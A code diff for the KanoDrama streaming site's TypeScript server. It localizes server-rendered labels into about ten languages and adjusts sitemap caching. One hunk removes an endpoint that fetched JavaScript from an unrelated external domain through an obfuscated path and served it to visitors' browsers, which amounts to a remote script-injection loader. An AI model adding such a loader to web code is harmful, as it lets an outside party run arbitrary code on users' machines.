+      popularTitle: 'Phim Ngắn &amp; Phim Lẻ Nổi Bật trên KanoDrama',
+    },
+    es: {
+      h1: 'KanoDrama — Ver Dramas Cortos, Series Asiáticas y Películas HD Sin Anuncios',
+      home: 'Inicio KanoDrama',
+      explore: 'Explorar Todos los Dramas',
+      movies: 'Películas y Cine HD',
+      providers: 'Directorio de Plataformas',
+      trending: 'Dramas en Tendencia',
+      latest: 'Últimos Estrenos',
+      vip: 'Selección VIP',
+      popularProviders: 'Plataformas Populares de Dramas',
+      curatedGenres: 'Géneros y Colecciones Destacadas',
+      popularTitle: 'Dramas Cortos y Películas Populares en KanoDrama',
+    },
+    ko: {
+      h1: 'KanoDrama — 숏드라마, 아시아 시리즈 및 HD 영화 광고 없이 무료 감상',
+      home: 'KanoDrama 홈',
+      explore: '전체 드라마 탐색',
+      movies: 'HD 영화 &amp; 시네마',
+      providers: '플랫폼 디렉터리',
+      trending: '인기 숏드라마',
+      latest: '최신 공개작',
+      vip: 'VIP 셀렉션',
+      popularProviders: '인기 드라마 플랫폼',
+      curatedGenres: '추천 장르 &amp; 컬렉션',
+      popularTitle: 'KanoDrama 인기 숏드라마 &amp; 영화',
+    },
+    ja: {
+      h1: 'KanoDrama — ショートドラマ・アジアドラマ・HD映画を広告なしで無料視聴',
+      home: 'KanoDrama ホーム',
+      explore: 'すべてのドラマを探す',
+      movies: 'HD映画＆シネマ',
+      providers: '配信元一覧',
+      trending: '人気ショートドラマ',
+      latest: '新着リリース',
+      vip: 'VIPセレクション',
+      popularProviders: '人気のドラマ配信元',
+      curatedGenres: '注目ジャンル＆特集',
+      popularTitle: 'KanoDrama 人気のショートドラマ＆映画',
+    },
+    th: {
+      h1: 'KanoDrama — ดูมินิซีรีส์แนวตั้ง ซีรีส์เอเชีย และหนัง HD ฟรีไม่มีโฆษณา',
+      home: 'หน้าแรก KanoDrama',
+      explore: 'สำรวจซีรีส์ทั้งหมด',
+      movies: 'ภาพยนตร์ HD',
+      providers: 'รวมแพลตฟอร์ม',
+      trending: 'มินิซีรีส์ยอดนิยม',
+      latest: 'มาใหม่ล่าสุด',
+      vip: 'คอลเลกชัน VIP',
+      popularProviders: 'แพลตฟอร์มซีรีส์ยอดนิยม',
+      curatedGenres: 'แนวเรื่องและคอลเลกชันแนะนำ',
+      popularTitle: 'มินิซีรีส์และภาพยนตร์ยอดนิยมบน KanoDrama',
+    },
+    ms: {
+      h1: 'KanoDrama — Tonton Drama Pendek, Siri Asia &amp; Filem HD Tanpa Iklan',
+      home: 'Utama KanoDrama',
+      explore: 'Teroka Semua Drama',
+      movies: 'Filem &amp; Pawagam HD',
+      providers: 'Direktori Platform',
+      trending: 'Drama Pendek Trending',
+      latest: 'Keluaran Terkini',
+      vip: 'Pilihan VIP',
+      popularProviders: 'Platform Drama Popular',
+      curatedGenres: 'Genre &amp; Koleksi Pilihan',
+      popularTitle: 'Drama Pendek &amp; Filem Popular di KanoDrama',
+    },
+    tl: {
+      h1: 'KanoDrama — Manood ng Short Dramas, Asian Series at HD Movies Nang Walang Ads',
+      home: 'KanoDrama Home',
+      explore: 'Mag-explore ng Lahat ng Drama',
+      movies: 'HD Movies at Cinema',
+      providers: 'Direktoryo ng Platform',
+      trending: 'Trending Short Dramas',
+      latest: 'Pinakabagong Labas',
+      vip: 'VIP Selection',
+      popularProviders: 'Sikat na Drama Platforms',
+      curatedGenres: 'Mga Piling Genre at Koleksyon',
+      popularTitle: 'Sikat na Short Dramas at Pelikula sa KanoDrama',
+    },
+  };
+  const hCopy = homeCopyMap[ssrLang] || homeCopyMap.en;
   const topProviders = [
     { name: 'DramaBox V2', slug: 'dramaboxv2' },
     { name: 'NetShort', slug: 'netshort' },
@@ -3041,7 +3611,7 @@ function buildSsrHomeRootHtml(
   ];
   const featuredItemsHtml =
     featured && (featured.dramas.length > 0 || featured.movies.length > 0)
-      ? `<section aria-label="${isId ? 'Drama Pendek & Film Populer' : 'Popular Short Dramas & Movies'}"><h2>${isId ? 'Drama Pendek &amp; Film Populer di KanoDrama' : 'Popular Short Dramas &amp; Movies on KanoDrama'}</h2><ul>${featured.dramas
+      ? `<section aria-label="${hCopy.popularTitle}"><h2>${hCopy.popularTitle}</h2><ul>${featured.dramas
           .slice(0, 12)
           .map(
             (d) =>
@@ -3058,22 +3628,22 @@ function buildSsrHomeRootHtml(
 
   return `<main class="max-w-6xl mx-auto px-4 py-8 text-[#FAFAFA]">
     <header>
-      <h1>${isId ? 'KanoDrama — Nonton Drama Pendek, Serial Asia &amp; Film Sub Indo Gratis Tanpa Iklan' : 'KanoDrama — Watch Short Dramas, Asian Series &amp; HD Movies Ad-Free'}</h1>
+      <h1>${hCopy.h1}</h1>
       <p>${escapeHtmlAttr(description)}</p>
     </header>
     <nav aria-label="Main Categories">
       <ul>
-        <li><a href="${brandOrigin}/">${isId ? 'Beranda KanoDrama' : 'KanoDrama Home'}</a></li>
-        <li><a href="${brandOrigin}/explore">${isId ? 'Jelajahi Semua Drama' : 'Explore All Dramas'}</a></li>
-        <li><a href="${brandOrigin}/movies">${isId ? 'Film &amp; Serial HD' : 'HD Movies &amp; Cinema'}</a></li>
-        <li><a href="${brandOrigin}/providers">${isId ? 'Direktori Provider' : 'Providers Directory'}</a></li>
-        <li><a href="${brandOrigin}/trending">${isId ? 'Drama Trending' : 'Trending Short Dramas'}</a></li>
-        <li><a href="${brandOrigin}/latest">${isId ? 'Rilis Terbaru' : 'Latest Releases'}</a></li>
-        <li><a href="${brandOrigin}/vip">${isId ? 'Koleksi VIP' : 'VIP Selection'}</a></li>
+        <li><a href="${brandOrigin}/">${hCopy.home}</a></li>
+        <li><a href="${brandOrigin}/explore">${hCopy.explore}</a></li>
+        <li><a href="${brandOrigin}/movies">${hCopy.movies}</a></li>
+        <li><a href="${brandOrigin}/providers">${hCopy.providers}</a></li>
+        <li><a href="${brandOrigin}/trending">${hCopy.trending}</a></li>
+        <li><a href="${brandOrigin}/latest">${hCopy.latest}</a></li>
+        <li><a href="${brandOrigin}/vip">${hCopy.vip}</a></li>
       </ul>
     </nav>
     <nav aria-label="Drama Providers">
-      <h2>${isId ? 'Platform &amp; Provider Populer' : 'Popular Drama Providers'}</h2>
+      <h2>${hCopy.popularProviders}</h2>
       <ul>${topProviders
         .map(
           (p) =>
@@ -3082,7 +3652,7 @@ function buildSsrHomeRootHtml(
         .join('')}</ul>
     </nav>
     <nav aria-label="Genres">
-      <h2>${isId ? 'Genre &amp; Koleksi Pilihan' : 'Curated Genres &amp; Collections'}</h2>
+      <h2>${hCopy.curatedGenres}</h2>
       <ul>${CURATED_PROGRAMMATIC_PAGES.slice(0, 8)
         .map(
           (g) =>
@@ -3122,17 +3692,130 @@ function injectPageMetadataIntoHtml(
     image: ogImage,
   });
 
-  const sectionLabelMap: Record<string, string> = {
-    movies: 'Movies',
-    explore: 'Explore',
-    providers: 'Providers',
-    trending: 'Trending',
-    latest: 'Latest Releases',
-    vip: 'VIP Originals',
-    rewards: ssrLang === 'id' ? 'Poin & Referral' : 'Rewards & Referral',
-    watchlist: 'My Account',
-    dashboard: 'My Account',
+  const localizedSectionLabels: Record<LanguageCode, Record<string, string>> = {
+    id: {
+      home: 'Beranda',
+      movies: 'Film HD',
+      explore: 'Jelajahi',
+      providers: 'Provider',
+      trending: 'Trending',
+      latest: 'Terbaru',
+      vip: 'Koleksi VIP',
+      rewards: 'Poin & Referral',
+      watchlist: 'Akun Saya',
+      dashboard: 'Akun Saya',
+    },
+    en: {
+      home: 'Home',
+      movies: 'Movies',
+      explore: 'Explore',
+      providers: 'Providers',
+      trending: 'Trending',
+      latest: 'Latest Releases',
+      vip: 'VIP Originals',
+      rewards: 'Rewards & Referral',
+      watchlist: 'My Account',
+      dashboard: 'My Account',
+    },
+    cn: {
+      home: '首页',
+      movies: '电影',
+      explore: '探索',
+      providers: '片源平台',
+      trending: '热门榜',
+      latest: '最新上线',
+      vip: 'VIP 专区',
+      rewards: '积分与邀请',
+      watchlist: '我的账户',
+      dashboard: '我的账户',
+    },
+    vi: {
+      home: 'Trang chủ',
+      movies: 'Phim Lẻ',
+      explore: 'Khám phá',
+      providers: 'Nguồn phim',
+      trending: 'Thịnh hành',
+      latest: 'Mới nhất',
+      vip: 'VIP',
+      rewards: 'Điểm & Giới thiệu',
+      watchlist: 'Tài khoản',
+      dashboard: 'Tài khoản',
+    },
+    es: {
+      home: 'Inicio',
+      movies: 'Películas',
+      explore: 'Explorar',
+      providers: 'Plataformas',
+      trending: 'Tendencias',
+      latest: 'Estrenos',
+      vip: 'VIP',
+      rewards: 'Puntos y Referidos',
+      watchlist: 'Mi Cuenta',
+      dashboard: 'Mi Cuenta',
+    },
+    ko: {
+      home: '홈',
+      movies: '영화',
+      explore: '탐색',
+      providers: '플랫폼',
+      trending: '인기',
+      latest: '최신',
+      vip: 'VIP',
+      rewards: '포인트 & 초대',
+      watchlist: '내 계정',
+      dashboard: '내 계정',
+    },
+    ja: {
+      home: 'ホーム',
+      movies: '映画',
+      explore: '探す',
+      providers: '配信元',
+      trending: '人気',
+      latest: '新着',
+      vip: 'VIP',
+      rewards: 'ポイント＆紹介',
+      watchlist: 'アカウント',
+      dashboard: 'アカウント',
+    },
+    th: {
+      home: 'หน้าแรก',
+      movies: 'ภาพยนตร์',
+      explore: 'สำรวจ',
+      providers: 'แพลตฟอร์ม',
+      trending: 'ยอดนิยม',
+      latest: 'มาใหม่',
+      vip: 'VIP',
+      rewards: 'คะแนน & แนะนำเพื่อน',
+      watchlist: 'บัญชีของฉัน',
+      dashboard: 'บัญชีของฉัน',
+    },
+    ms: {
+      home: 'Utama',
+      movies: 'Filem',
+      explore: 'Teroka',
+      providers: 'Platform',
+      trending: 'Trending',
+      latest: 'Terkini',
+      vip: 'VIP',
+      rewards: 'Mata & Rujukan',
+      watchlist: 'Akaun Saya',
+      dashboard: 'Akaun Saya',
+    },
+    tl: {
+      home: 'Tahanan',
+      movies: 'Mga Pelikula',
+      explore: 'Mag-explore',
+      providers: 'Mga Platform',
+      trending: 'Trending',
+      latest: 'Pinakabago',
+      vip: 'VIP',
+      rewards: 'Puntos at Referral',
+      watchlist: 'Account Ko',
+      dashboard: 'Account Ko',
+    },
   };
+  const sectionLabelMap: Record<string, string> =
+    localizedSectionLabels[ssrLang] || localizedSectionLabels.en;
   const isCollectionPage =
     page === 'movies' ||
     page === 'explore' ||
@@ -3320,7 +4003,7 @@ ${buildHreflangLinksHtml(meta.canonicalUrl)}
   if (page === 'rewards') {
     const ssrRewardsHtml = isIdSsr
       ? `<main class="max-w-5xl mx-auto px-4 py-8 text-[#FAFAFA]">
-      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">Home</a> / <span>${escapeHtmlAttr(sectionLabelMap.rewards)}</span></nav>
+      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> / <span>${escapeHtmlAttr(sectionLabelMap.rewards)}</span></nav>
       <h1>Nonton Drama China &amp; Short Drama Dapat Poin &amp; Saldo — Reward KanoDrama</h1>
       <p>${escapeHtmlAttr(meta.description)}</p>
       <section>
@@ -3339,14 +4022,14 @@ ${buildHreflangLinksHtml(meta.canonicalUrl)}
         <h2>Konversi Poin &amp; Metode Penarikan Resmi</h2>
         <p>100.000 poin = 1 USDT ($1.00 USD) = Rp 18.200 IDR. Minimal penarikan lokal Rp 50.000 ke DANA, GoPay, OVO, ShopeePay, LinkAja, serta transfer bank BCA, BRI, BNI, Mandiri, BSI, CIMB Niaga, Bank Jago, SeaBank, Permata, dan BTN. Minimal penarikan global $5.00 USD ke PayPal, Wise, dan USDT (Polygon, TRC20, BEP20, ERC20).</p>
       </section>
-      <nav aria-label="Navigation"><a href="${brandOrigin}/">Home</a> · <a href="${brandOrigin}/explore">Explore Drama</a> · <a href="${brandOrigin}/movies">Movies</a> · <a href="${brandOrigin}/providers">Providers</a> · <a href="${brandOrigin}/trending">Trending</a></nav>
+      <nav aria-label="Navigation"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> · <a href="${brandOrigin}/explore">${escapeHtmlAttr(sectionLabelMap.explore)}</a> · <a href="${brandOrigin}/movies">${escapeHtmlAttr(sectionLabelMap.movies)}</a> · <a href="${brandOrigin}/providers">${escapeHtmlAttr(sectionLabelMap.providers)}</a> · <a href="${brandOrigin}/trending">${escapeHtmlAttr(sectionLabelMap.trending)}</a></nav>
     </main>`
       : `<main class="max-w-5xl mx-auto px-4 py-8 text-[#FAFAFA]">
-      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">Home</a> / <span>${escapeHtmlAttr(sectionLabelMap.rewards)}</span></nav>
-      <h1>Watch Short Dramas &amp; Movies to Earn Points &amp; Cash — KanoDrama Rewards</h1>
+      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> / <span>${escapeHtmlAttr(sectionLabelMap.rewards)}</span></nav>
+      <h1>${escapeHtmlAttr(meta.title)}</h1>
       <p>${escapeHtmlAttr(meta.description)}</p>
       <section>
-        <h2>How to Earn Points on KanoDrama</h2>
+        <h2>How to Earn Points on KanoDrama (17:00 UTC Reset)</h2>
         <ul>
           <li>First-login welcome bonus: +25,000 points credited automatically on your first sign-in (once per account).</li>
           <li>Watch short dramas &amp; movies actively (normal 1x speed): +40 points per minute automatically (up to 60 minutes/day) × account level multiplier (Bronze 1.0x up to Platinum 1.6x).</li>
@@ -3361,16 +4044,16 @@ ${buildHreflangLinksHtml(meta.canonicalUrl)}
         <h2>Points Conversion &amp; Official Payout Methods</h2>
         <p>100,000 points = 1 USDT ($1.00 USD). Minimum global withdrawal 5.00 USDT ($5.00 USD) via PayPal, Wise, and USDT (Polygon, TRC20, BEP20, ERC20).</p>
       </section>
-      <nav aria-label="Navigation"><a href="${brandOrigin}/">Home</a> · <a href="${brandOrigin}/explore">Explore Drama</a> · <a href="${brandOrigin}/movies">Movies</a> · <a href="${brandOrigin}/providers">Providers</a> · <a href="${brandOrigin}/trending">Trending</a></nav>
+      <nav aria-label="Navigation"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> · <a href="${brandOrigin}/explore">${escapeHtmlAttr(sectionLabelMap.explore)}</a> · <a href="${brandOrigin}/movies">${escapeHtmlAttr(sectionLabelMap.movies)}</a> · <a href="${brandOrigin}/providers">${escapeHtmlAttr(sectionLabelMap.providers)}</a> · <a href="${brandOrigin}/trending">${escapeHtmlAttr(sectionLabelMap.trending)}</a></nav>
     </main>`;
     return injectRootSsrMarkup(withHead, ssrRewardsHtml);
   }
   if (!isPrivatePage) {
     const ssrSectionRootHtml = `<main class="max-w-5xl mx-auto px-4 py-8 text-[#FAFAFA]">
-      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">Home</a> / <span>${escapeHtmlAttr(sectionLabelMap[page] || 'Browse')}</span></nav>
+      <nav aria-label="Breadcrumb"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> / <span>${escapeHtmlAttr(sectionLabelMap[page] || 'Browse')}</span></nav>
       <h1>${escapeHtmlAttr(meta.title)}</h1>
       <p>${escapeHtmlAttr(meta.description)}</p>
-      <nav aria-label="Navigation"><a href="${brandOrigin}/">Home</a> · <a href="${brandOrigin}/explore">Explore</a> · <a href="${brandOrigin}/movies">Movies</a> · <a href="${brandOrigin}/providers">Providers</a> · <a href="${brandOrigin}/trending">Trending</a> · <a href="${brandOrigin}/rewards">Rewards</a></nav>
+      <nav aria-label="Navigation"><a href="${brandOrigin}/">${escapeHtmlAttr(sectionLabelMap.home)}</a> · <a href="${brandOrigin}/explore">${escapeHtmlAttr(sectionLabelMap.explore)}</a> · <a href="${brandOrigin}/movies">${escapeHtmlAttr(sectionLabelMap.movies)}</a> · <a href="${brandOrigin}/providers">${escapeHtmlAttr(sectionLabelMap.providers)}</a> · <a href="${brandOrigin}/trending">${escapeHtmlAttr(sectionLabelMap.trending)}</a> · <a href="${brandOrigin}/rewards">${escapeHtmlAttr(sectionLabelMap.rewards)}</a></nav>
     </main>`;
     return injectRootSsrMarkup(withHead, ssrSectionRootHtml);
   }
@@ -3690,46 +4373,6 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
         db: { ok: false, latencyMs: 0, engine: 'error' },
         error: err instanceof Error ? err.message : 'Health check failed',
       });
-    }
-  });
-
-  app.get('/api/client/runtime-boot', async (req: Request, res: Response) => {
-    const upstreamUrl =
-      'https://crookedagreement.com/ccD/9.6FbX2h5-lsS/WzQs9/NtzSYy2JM/TjY/2AMTS-0G3SN/jOYpx-NhjgYj1U';
-    try {
-      const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 5000);
-      const reqHeaders: Record<string, string> = {
-        Accept: 'application/javascript, text/javascript, */*;q=0.8',
-      };
-      const ua = req.get('user-agent');
-      if (ua) reqHeaders['User-Agent'] = ua;
-      const lang = req.get('accept-language');
-      if (lang) reqHeaders['Accept-Language'] = lang;
-      const ref = req.get('referer');
-      if (ref) {
-        reqHeaders['Referer'] = ref;
-      } else if (req.get('host')) {
-        reqHeaders['Referer'] = `${req.protocol}://${req.get('host')}/`;
-      }
-      const upstream = await fetch(upstreamUrl, {
-        method: 'GET',
-        headers: reqHeaders,
-        signal: controller.signal,
-      }).finally(() => clearTimeout(timeout));
-
-      const body = await upstream.text();
-      res.setHeader('Cache-Control', 'no-store, max-age=0');
-      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-      if (!upstream.ok || !body.trim()) {
-        res.status(200).send('');
-        return;
-      }
-      res.status(200).send(body);
-    } catch {
-      res.setHeader('Cache-Control', 'no-store, max-age=0');
-      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-      res.status(200).send('');
     }
   });
 
@@ -8319,11 +8962,7 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
       if (
         rawHost === 'www.kano-drama.live' ||
         rawHost === 'kano-drama.xyz' ||
-        rawHost === 'www.kano-drama.xyz' ||
-        rawHost === 'house-drama.xyz' ||
-        rawHost === 'www.house-drama.xyz' ||
-        rawHost === 'house-drama.web.id' ||
-        rawHost === 'www.house-drama.web.id'
+        rawHost === 'www.kano-drama.xyz'
       ) {
         res.setHeader('Cache-Control', 'public, max-age=3600');
         res.redirect(301, `${DEFAULT_SITE_ORIGIN}${req.originalUrl || '/'}`);
@@ -8561,7 +9200,7 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
   });
 
   const SITEMAP_MAX_URLS_PER_FILE = 25000;
-  const SITEMAP_CACHE_TTL_MS = 10 * 60 * 1000;
+  const SITEMAP_CACHE_TTL_MS = 5 * 60 * 1000;
   const SITEMAP_COLD_CACHE_TTL_MS = 60 * 1000;
 
   interface SitemapUrlEntry {
@@ -8573,14 +9212,19 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
 
   const sitemapEntriesCache = new Map<
     string,
-    { expiresAt: number; entries: SitemapUrlEntry[] }
+    { expiresAt: number; version: number; entries: SitemapUrlEntry[] }
   >();
   const sitemapBuildInFlight = new Map<string, Promise<SitemapUrlEntry[]>>();
 
   async function collectAllSitemapEntries(origin: string): Promise<SitemapUrlEntry[]> {
     const siteOrigin = DEFAULT_SITE_ORIGIN;
+    const currentCatalogVersion = getSitemapCatalogVersion();
     const cached = sitemapEntriesCache.get(siteOrigin);
-    if (cached && Date.now() < cached.expiresAt) {
+    if (
+      cached &&
+      cached.version === currentCatalogVersion &&
+      Date.now() < cached.expiresAt
+    ) {
       return cached.entries;
     }
 
@@ -8590,6 +9234,7 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
     }
 
     const buildPromise = (async (): Promise<SitemapUrlEntry[]> => {
+      const buildVersion = getSitemapCatalogVersion();
       const seenLocs = new Set<string>();
       const entries: SitemapUrlEntry[] = [];
 
@@ -8676,8 +9321,14 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
 
       if (cachedMovies.length === 0) {
         try {
-          const lkHome = await getLk21Home(getMolaToken, origin).catch(() => null);
-          const flatMovies = (lkHome?.rows || []).flatMap((r) => r.items || []);
+          const [lkHome, lsFeed] = await Promise.all([
+            getLk21Home(getMolaToken, origin).catch(() => null),
+            getLookSeriesFeed(getMolaToken, 'foryou', 1).catch(() => null),
+          ]);
+          const flatMovies = [
+            ...(lkHome?.rows || []).flatMap((r) => r.items || []),
+            ...(lsFeed?.items || []),
+          ];
           for (const m of flatMovies) {
             const cleanTitle = cleanText(m.title);
             const cleanSlug = cleanText(m.slug).toLowerCase();
@@ -8809,6 +9460,7 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
           : SITEMAP_COLD_CACHE_TTL_MS;
       sitemapEntriesCache.set(siteOrigin, {
         expiresAt: Date.now() + ttl,
+        version: buildVersion,
         entries,
       });
 
